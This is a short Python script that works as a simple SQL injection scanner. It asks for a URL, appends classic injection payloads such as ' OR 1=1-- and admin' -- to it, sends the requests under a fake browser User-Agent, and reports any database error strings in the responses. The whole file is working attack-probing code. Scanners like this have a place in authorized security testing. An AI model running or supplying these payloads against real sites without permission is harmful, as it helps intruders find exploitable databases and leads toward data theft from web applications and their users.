import requests

url = input("Enter URL : ")

payloads =[
    "' OR '1'='1",
    "' OR 1=1--",
    "' AND 1=1--",
    "' AND 1=2--",
    "'",
    "/",
    "';--",
    "' or 1=1/*",
    "admin' --"
]

error_signatures =[
    "sql syntax",
    "mysql_fetch",
    "you have an error",
    "warning",
    "unclosed quotation",
]
# fake browser headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/117.0 Safari/537.36"
}
for payload in payloads:
    test_url = url + payload
    try:
        response = requests.get(test_url,headers=headers, timeout=5)
        print(f"Testing payload : {payload}")

        if any(error.lower() in response.text.lower() for error in error_signatures):
             print(f" possible sql injection vulnerability with payload : {payload}\n")

        else:
            print(f"no detection :{payload}\n")
 
    except Exception as e:
        print(f"requests failed : {e}\n")




                
            